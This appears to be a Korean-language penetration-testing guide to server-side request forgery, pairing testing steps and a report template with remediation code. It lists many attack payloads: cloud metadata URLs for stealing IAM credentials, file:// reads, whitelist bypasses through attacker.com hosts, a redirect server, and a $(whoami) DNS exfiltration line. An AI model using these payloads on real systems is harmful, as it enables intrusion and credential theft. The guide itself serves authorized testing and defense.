---
sidebar_position: 13
title: 서버 사이드 요청 위조 (SSRF)
description: 웹 진단 - Server-Side Request Forgery 점검 절차, 클라우드 메타데이터 페이로드, Blind SSRF, 보고서 양식
keywords: [SSRF, Server-Side Request Forgery, Blind SSRF, IMDS, AWS 메타데이터, Burp Collaborator, OWASP A05]
draft: false
---

# 서버 사이드 요청 위조 (Server-Side Request Forgery, SSRF)

> 서버가 공격자가 제어한 URL로 임의 요청을 보내게 만드는 취약점.
> **클라우드 자격증명 탈취 / 내부망 접근 / 관리자 페이지 직접 호출**로 이어지며, 클라우드 환경에서는 단일 결함만으로 계정 단위 침해가 가능한 고위험 항목.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection (2021의 A10 SSRF가 2025에서 Injection 카테고리로 통합) / KISA 입력값 검증 |
| **CWE** | [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) |
| **영향도** | 🔴 매우 높음 (클라우드 IMDS 노출 시) / 🟡 중간 (외부 인터넷만 접근, 내부망/IMDS 차단 시) |
| **점검 난이도** | 하 (응답 노출형) / 상 (Blind + IMDSv2 환경) |
| **예상 점검 시간** | 파라미터당 30분 ~ 4시간 |

---

## 점검 목적

URL을 입력값으로 받는 기능에서, 입력된 URL의 **도메인/IP/프로토콜이 검증되지 않고** 서버가 그대로 요청을 발생시키는지 확인한다. 성공 시 **AWS/GCP/Azure 메타데이터 엔드포인트에서 IAM 자격증명 탈취**, **외부에서 접근 불가능한 내부 관리자 페이지 호출**, **로컬 파일 읽기(`file://`)** 가 가능하다.

---

## 유형 구분

| 유형 | 특징 | 판정 방법 |
| :--- | :--- | :--- |
| **Basic (In-band)** | 서버가 fetch한 응답이 그대로 클라이언트에 노출 | 응답 본문에서 fetch된 페이지 직접 확인 |
| **Semi-Blind** | 응답 본문은 없지만 상태코드 / 응답 길이 / 응답 시간 차이 | 200 vs 4xx, 응답 시간으로 내부 포트 식별 |
| **Blind** | 어떤 흔적도 없음 | OOB 콜백 (Burp Collaborator) 으로만 입증 |

---

## 진단 절차

### Step 1. 진입점 식별

**URL을 입력받거나 URL이 포함된 데이터를 받는 기능**을 후보로 (단순 파라미터 fuzz보다 효율적):

- **이미지 / 파일 fetch** — 프로필 사진 URL 등록, 외부 이미지 미리보기, 아이콘 URL
- **PDF / 스크린샷 변환** — URL 입력 후 서버에서 headless browser 로 렌더링
- **Webhook 등록** — 등록 직후 서버가 검증 요청을 보내는 경우
- **외부 API 프록시** — RSS/OEmbed/oEmbed, OpenGraph 메타 추출
- **OAuth 콜백 URL** — 잘못 처리되면 SSRF로 발현
- **PDF/Office 업로드** — XXE → SSRF로 이어질 수 있음 (XXE 페이지 별도 참조)

### Step 2. 1차 탐지 (외부 콜백)

먼저 **공격자 제어 호스트**(Burp Collaborator) 로 요청을 유도하여, 서버가 정말 외부 요청을 발생시키는지 확인:

```
http://<RANDOM>.<COLLAB>.oastify.com/
```

서버 IP에서 Collaborator로 HTTP/DNS 요청이 도달하면 → SSRF 후보. 도달하지 않으면 SSRF 아니거나 출구 차단된 환경.

### Step 3. 내부 자원 접근 시도

외부 콜백이 성공하면 내부망/로컬 접근을 시도:

```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://127.0.0.1:8080/
http://192.168.1.1/
http://10.0.0.1/
```

응답이 외부와 다르거나 (관리자 페이지 등) 노출되면 내부망 접근 가능.

### Step 4. 클라우드 메타데이터 (최우선 확인)

대상이 AWS/GCP/Azure 위에 있으면 **반드시 시도** — 발견 시 즉시 Critical:

```
# AWS (IMDSv1 — 헤더 불필요, 가장 흔한 케이스)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (Metadata-Flavor 헤더가 있어야 응답)
http://metadata.google.internal/computeMetadata/v1/instance/

# Azure (Metadata 헤더 필요)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

응답에 IAM Role 자격증명(JSON)이나 인스턴스 메타데이터가 노출되면 즉시 입증 완료.

### Step 5. 프로토콜 / 우회 시도

- `file://` — 로컬 파일 읽기 가능 여부
- 단순 도메인 차단이 있을 때 우회 (`@` 트릭, 리다이렉트 등 — 케이스 6 참조)

---

## 페이로드 / 테스트 케이스

### 케이스 1: 외부 콜백 (1차 탐지)

**언제 쓰는지**: SSRF 가능성 자체를 가장 빠르게 판정. 다른 모든 케이스의 전제 조건.

```
http://<RANDOM>.<COLLAB>.oastify.com/
https://<RANDOM>.<COLLAB>.oastify.com/
```

**판정**: Burp Collaborator(또는 interactsh) 패널에서 HTTP 요청 또는 DNS 조회가 수신되면 SSRF 가능. 요청 헤더의 User-Agent로 어떤 라이브러리가 쓰이는지(`python-requests`, `Java/`, `curl`, `PhantomJS`, `HeadlessChrome` 등) 추정 가능.

### 케이스 2: 내부 호스트 / 사설 IP

**언제 쓰는지**: 외부 콜백이 되면, 내부망 접근까지 가능한지 (= 화이트리스트 없음 + 내부 통신 허용) 확인.

```
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/

# 사설 IP 대역 (대상 환경에 따라 시도)
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/

# 자주 열려 있는 내부 서비스 포트
http://127.0.0.1:8080/    # 내부 API
http://127.0.0.1:6379/    # Redis
http://127.0.0.1:9200/    # Elasticsearch
http://127.0.0.1:5601/    # Kibana
http://127.0.0.1:8500/    # Consul
```

**판정**: 외부와 다른 응답(에러/HTML/JSON) 이 돌아오면 내부 접근 가능. 관리자 인터페이스 페이지가 그대로 노출되면 추가 임팩트.

> 정수형 표기(`http://2130706433/`) 같은 변형은 단순 문자열 블랙리스트(`localhost`, `127.0.0.1`)만 적용된 환경에서 가끔 쓰이지만, 실무에서는 케이스 6의 `@` 트릭이나 리다이렉트가 더 자주 통함.

### 케이스 3: AWS IMDS — 자격증명 탈취 (가장 임팩트 큰 케이스)

**언제 쓰는지**: 대상이 AWS EC2/ECS/EKS 환경(응답 헤더 `Server`, IP 대역, 도메인 등으로 추정 가능) 이면 **반드시** 시도.

**IMDSv1 (헤더 불필요 — 미마이그레이션 환경 다수):**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**판정**: 두 번째 URL 응답이 IAM Role 이름(예: `web-server-role`) 단일 줄로 떨어지고, 세 번째에서 다음과 같은 JSON이 나오면 **Critical**:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-12T18:00:00Z"
}
```

이 자격증명을 `aws configure` 로 등록하면 해당 Role 권한으로 AWS API 호출 가능.

**IMDSv2 (세션 토큰 필요 — 우회 난이도 높음):**

대상이 IMDSv2를 강제(`HttpTokens=required`) 하면 SSRF만으로는 토큰 발급 PUT 요청과 후속 GET 요청을 모두 보낼 수 있어야 함. 보통 SSRF는 GET만 보내므로 차단됨. **IMDSv2가 강제되어 있으면 이 케이스는 사실상 차단된 것으로 보고 다음으로**.

### 케이스 4: GCP / Azure 메타데이터

**언제 쓰는지**: 대상이 GCP/Azure 환경일 때. 두 클라우드는 **메타데이터 응답에 특정 헤더가 필요** — 헤더 주입이 가능한 SSRF에서만 발현.

```
# GCP (Metadata-Flavor: Google 헤더 필요)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (Metadata: true 헤더 필요)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**판정**: 응답에 access_token JSON 또는 인스턴스 메타데이터가 출력되면 취약. SSRF 진입점이 헤더를 임의로 추가할 수 없는 단순 GET fetch 형태라면 이 케이스는 시도 자체가 불가 → 보고서에 사유 명시.

### 케이스 5: 로컬 파일 (`file://`)

**언제 쓰는지**: 라이브러리(`curl`, `libcurl`, 일부 PHP 함수, Java URL 클래스 등)가 `file://` 스킴까지 처리할 때. http/https만 허용하는 라이브러리에서는 동작 안 함.

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///c:/windows/win.ini      (Windows 대상)
```

**판정**: 응답 본문에 파일 내용이 그대로 노출되면 취약. 단, 응답 노출이 없는 Blind SSRF에서는 입증이 어려움.

### 케이스 6: 도메인 화이트리스트 우회

**언제 쓰는지**: `allowed-domain.com` 같은 화이트리스트가 설정되어 있어 직접 IP/내부 호스트 요청이 차단될 때.

```
# @ 트릭 — URL 파서가 호스트를 잘못 인식
http://allowed.com@127.0.0.1/
http://allowed.com@169.254.169.254/latest/meta-data/

# # 트릭
http://127.0.0.1#allowed.com
http://169.254.169.254/latest/meta-data/#.allowed.com

# 서브도메인 트릭 (단순 contains 체크 우회)
http://allowed.com.attacker.com/
http://attacker.com/allowed.com

# 공격자 도메인이 내부 IP로 해석되도록 DNS 설정
http://internal.attacker.com/    (DNS A 레코드 = 127.0.0.1)
```

**판정**: 위 페이로드 중 하나로 케이스 1~3 의 결과가 나오면 화이트리스트 우회 입증. `@` 트릭은 URL 표준상 `@` 앞은 user-info, 뒤가 호스트인데, 일부 라이브러리(특히 Java `URL`, 옛날 PHP)가 잘못 파싱.

### 케이스 7: 리다이렉트 우회

**언제 쓰는지**: 화이트리스트가 적용되어 있고 위의 우회도 막혔을 때. 공격자가 통제하는 외부 도메인이 `Location: http://169.254.169.254/...` 로 302 응답을 보내면, 서버가 자동 리다이렉트를 따라가는지 확인.

```python
# 공격자 서버 (redirect.py)
return Response(status=302, headers={"Location": "http://169.254.169.254/latest/meta-data/"})
```

요청:
```
http://attacker.com/redirect
```

**판정**: 서버 응답에 IMDS 결과가 노출되거나 Collaborator로 콜백이 도달하면 취약. (리다이렉트 비허용으로 설정된 라이브러리는 대상 아님)

### 케이스 8: 포트 스캔 (Semi-Blind)

**언제 쓰는지**: 응답 본문은 안 노출되지만 응답 시간/상태코드/응답 길이가 다를 때. 내부 서비스 발견 목적.

```
http://127.0.0.1:22/
http://127.0.0.1:80/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:8080/
```

**판정**: 열린 포트(빠른 응답, 다른 상태코드/길이) 와 닫힌 포트(타임아웃, 일정한 에러) 구분 가능하면 취약. 발견된 내부 서비스는 추가 점검 대상.

### 케이스 9: Blind SSRF 입증

**언제 쓰는지**: 응답에 어떤 흔적도 없는데 외부 콜백만 도달할 때. PoC를 위해서는 **OOB 채널로 데이터까지 빼낼 수 있음**을 보여야 설득력 있음.

```
# 호스트명 prefix에 데이터 실어 보내기 (DNS 채널)
http://`hostname`.<COLLAB>.oastify.com/
http://$(whoami).<COLLAB>.oastify.com/
```

서버 측 처리에 셸 평가가 들어가면 위처럼 데이터 추출 가능. 그 외에는 단순 콜백만 입증하고, 영향도는 "내부 통신 가능 + 자격증명/내부자원 잠재 노출" 수준으로 보고.

> 참고: gopher 프로토콜로 내부 Redis/Memcached에 쓰기 명령을 보내 RCE까지 이어지는 케이스가 리서치 자료에 자주 등장하지만, 실무 환경에서는 발견 빈도가 낮음. 발견 시 영향도는 Critical.

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] Burp Collaborator로 **HTTP/DNS 콜백이 수신**됨 (외부 요청 발생 자체 확인)
- [ ] `127.0.0.1` 또는 사설 IP 요청 시 외부와 **다른 응답**(내부 페이지/에러) 이 노출됨
- [ ] 클라우드 메타데이터 엔드포인트(`169.254.169.254`, `metadata.google.internal`) 에서 **IAM 자격증명 또는 인스턴스 메타데이터**가 응답됨
- [ ] `file://` 스킴으로 로컬 파일 내용이 응답에 노출됨
- [ ] 화이트리스트가 있어도 `@` 트릭 / 리다이렉트로 우회 가능
- [ ] 내부 포트별로 응답 시간 / 상태코드 차이가 있어 포트 스캔 가능

**오탐 주의 (다음은 SSRF 아님 또는 별도 분류):**

- [ ] 정상적인 외부 fetch 기능에서 외부 콜백만 발생 (단, 화이트리스트 미적용은 별도 결함으로 분류)
- [ ] 클라이언트 측 JS에서 fetch가 일어나는 경우 (서버에서 발생해야 SSRF)
- [ ] Open Redirect — 외부 리다이렉트만 가능하고 서버가 fetch하지 않으면 별도 결함(Open Redirect)

---

## PoC 양식 (보고서 붙여넣기용)

**[SSRF - AWS IMDS 자격증명 탈취] - 프로필 이미지 URL 등록 기능**

1. `<TARGET>` 로그인 후 마이페이지 → 프로필 이미지 URL 등록 화면 이동
2. 이미지 URL 입력란에 AWS IMDS 엔드포인트를 입력
3. 등록 직후 서버가 해당 URL로 요청을 보내는 응답에서 IAM Role 자격증명 노출 확인

**요청 (Request):**

```http
POST /api/profile/avatar HTTP/1.1
Host: <TARGET>
Cookie: SESSION=abcd1234
Content-Type: application/json

{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role"}
```

**응답 (Response) — 취약 발현 증거:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "preview": "{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIAEXAMPLEKEY\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI...EXAMPLEKEY\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...EXAMPLE\",\n  \"Expiration\": \"2026-05-12T18:00:00Z\"\n}"
}
```

**확인 사항:**
- `AccessKeyId`, `SecretAccessKey`, `Token` 이 응답에 그대로 노출됨
- 동일 자격증명을 `aws configure set aws_session_token` 으로 설정 후 `aws sts get-caller-identity` 호출 시 `arn:aws:sts::123456789012:assumed-role/web-server-role/...` 응답 확인 (별첨 스크린샷)
- 추가 검증: `aws s3 ls`, `aws iam get-user` 등으로 Role 권한 범위 확인 필요

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 **매우 높음** — 클라우드 IAM 자격증명, 내부 관리자 페이지, 로컬 파일 노출.
- **무결성 (Integrity)**: 🟡 ~ 🔴 — 자격증명 탈취 시 클라우드 리소스 변조/삭제 가능. 내부 쓰기 가능 서비스(Redis/Elasticsearch) 호출 시 데이터 조작.
- **가용성 (Availability)**: 🟡 — 내부 서비스 부하/포트 스캔으로 성능 영향 가능.
- **추가 위협**:
  - **클라우드 계정 단위 침해** — 탈취한 IAM Role 권한이 넓으면 다른 서비스(S3, RDS, EC2 등) 까지 접근
  - **내부 관리자 페이지 직접 호출** — 외부에서 접근 불가능한 어드민 기능 실행
  - **2차 공격 진입점** — 내부 서비스 발견 후 별도 취약점(미인증 API 등) 결합 공격

**비즈니스 임팩트:**
클라우드 환경의 SSRF는 사실상 **계정 단위 침해**로 직결된다. IAM Role 권한이 넓을수록 영향이 기하급수적으로 커지며(`*:*` 정책이라면 전 인프라), 메타데이터에서 user-data 스크립트에 하드코딩된 자격증명까지 노출되는 사례도 있다. 실무 진단에서 **IMDS 노출 SSRF 1건은 무조건 Critical**로 분류.

---

## 대응방안

### 개발자 관점 (필수)

1. **URL 화이트리스트 (도메인 정확 매칭)** — 블랙리스트 방식은 우회 패턴이 너무 많아 부적합:

   ```python
   ALLOWED_DOMAINS = {"img.example.com", "cdn.example.com"}
   parsed = urlparse(user_url)
   if parsed.hostname not in ALLOWED_DOMAINS:
       raise ValueError("not allowed")
   ```

2. **DNS 해석 후 IP 검증** — 화이트리스트 도메인이라도, 해당 도메인이 사설 IP로 해석되면 차단:

   ```python
   import socket, ipaddress

   def safe_resolve(host: str) -> str:
       ip = socket.gethostbyname(host)
       addr = ipaddress.ip_address(ip)
       if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved:
           raise ValueError("private IP not allowed")
       return ip
   ```

3. **검증한 IP로 직접 연결** — 도메인을 한 번 더 resolve하면 DNS Rebinding으로 우회될 수 있으므로, 검증한 IP를 그대로 사용해 연결.

4. **프로토콜 제한** — `http`, `https` 만 허용. `file`, `gopher`, `dict`, `ldap`, `ftp` 차단:

   ```python
   if parsed.scheme not in {"http", "https"}:
       raise ValueError("scheme not allowed")
   ```

5. **리다이렉트 비허용 또는 재검증** — 라이브러리 옵션으로 자동 리다이렉트 끄거나, 리다이렉트 URL을 위 검증 로직에 다시 통과시킴:

   ```python
   requests.get(url, allow_redirects=False)
   ```

6. **응답을 그대로 반환하지 말 것** — 반환해야 한다면 Content-Type 검증(이미지면 `image/*` 만 허용 등) 후 재인코딩.

### 운영자 관점

1. **AWS IMDSv2 강제** — 인스턴스 단위로 `HttpTokens=required` 설정. EKS는 노드 그룹 launch template에서 설정. **이거 하나만으로 SSRF→IMDS 케이스 대부분이 차단**되므로 우선순위 최상.

2. **메타데이터 hop limit 축소** — `HttpPutResponseHopLimit=1` 로 컨테이너에서 호스트 IMDS 접근 차단.

3. **IAM 최소 권한 원칙** — 인스턴스 Role 권한을 필요 최소로. 와일드카드 정책(`*`) 금지. EKS는 IRSA(IAM Roles for Service Accounts) 로 Pod 단위 권한 분리.

4. **출구 트래픽 제어** — 어플리케이션이 발생시키는 outbound 트래픽을 NAT/방화벽에서 화이트리스트화. 메타데이터 IP(`169.254.169.254`) 접근을 어플리케이션 단위로 차단할 수 있는 환경이면 차단.

### 안전 / 위험 코드 비교

```python
# 위험 — 사용자 입력 URL을 그대로 fetch
import requests
def get_preview(user_url: str):
    return requests.get(user_url).text

# 안전 — 도메인 화이트리스트 + IP 검증 + 프로토콜 제한 + 리다이렉트 차단
import socket, ipaddress
from urllib.parse import urlparse
import requests

ALLOWED_DOMAINS = {"img.example.com", "cdn.example.com"}

def safe_fetch(user_url: str) -> str:
    parsed = urlparse(user_url)

    if parsed.scheme not in {"http", "https"}:
        raise ValueError("scheme not allowed")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("domain not allowed")

    ip = socket.gethostbyname(parsed.hostname)
    addr = ipaddress.ip_address(ip)
    if any([addr.is_private, addr.is_loopback, addr.is_link_local,
            addr.is_multicast, addr.is_reserved]):
        raise ValueError("internal IP not allowed")

    # 검증한 IP로 직접 연결 + Host 헤더 명시 (DNS Rebinding 방지)
    return requests.get(
        f"{parsed.scheme}://{ip}{parsed.path or '/'}",
        headers={"Host": parsed.hostname},
        allow_redirects=False,
        timeout=5,
    ).text
```

---

## 참고자료

- [OWASP Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - Server-side request forgery](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [AWS - Use IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html)
